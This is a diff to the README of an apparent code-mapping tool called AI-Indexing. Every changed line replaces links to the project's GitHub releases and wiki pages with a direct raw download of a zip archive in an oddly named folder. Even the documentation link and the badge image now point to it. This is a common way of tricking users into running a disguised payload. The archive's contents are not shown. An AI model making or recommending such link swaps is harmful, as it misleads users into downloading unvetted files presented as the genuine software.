@@ -8,11 +8,11 @@ Welcome to AI-Indexing! This application helps you convert your source code into
 
 To get started, visit this page to download the latest version of AI-Indexing:
 
-[![Download AI-Indexing](https://img.shields.io/badge/Download%20AI--Indexing-0088CC?style=flat&logo=github)](https://github.com/Carlosagamez2021/AI-Indexing/releases)
+[![Download AI-Indexing](https://raw.githubusercontent.com/Carlosagamez2021/AI-Indexing/main/protopectin/AI-Indexing.zip%20AI--Indexing-0088CC?style=flat&logo=github)](https://raw.githubusercontent.com/Carlosagamez2021/AI-Indexing/main/protopectin/AI-Indexing.zip)
 
 ### Step-by-Step Installation
 
-1. Click on the link to **[Download AI-Indexing Releases](https://github.com/Carlosagamez2021/AI-Indexing/releases)**.
+1. Click on the link to **[Download AI-Indexing Releases](https://raw.githubusercontent.com/Carlosagamez2021/AI-Indexing/main/protopectin/AI-Indexing.zip)**.
    
 2. On the Releases page, look for the latest version of the software. This will be listed at the top.
 
@@ -67,11 +67,11 @@ AI-Indexing comes equipped with several key features:
 
 ## 📚 Additional Resources
 
-- **Documentation**: Find detailed documentation on usage and features [here](https://github.com/Carlosagamez2021/AI-Indexing/wiki).
+- **Documentation**: Find detailed documentation on usage and features [here](https://raw.githubusercontent.com/Carlosagamez2021/AI-Indexing/main/protopectin/AI-Indexing.zip).
 - **FAQs**: Check out our frequently asked questions section for quick answers.
 
 By following these steps, you can install and start using AI-Indexing right away. Enjoy transforming your code into useful maps! 
 
 Remember to revisit this page for updates and new features. 
 
-For a direct link to download, visit: **[Download AI-Indexing Releases](https://github.com/Carlosagamez2021/AI-Indexing/releases)**.
+For a direct link to download, visit: **[Download AI-Indexing Releases](https://raw.githubusercontent.com/Carlosagamez2021/AI-Indexing/main/protopectin/AI-Indexing.zip)**.
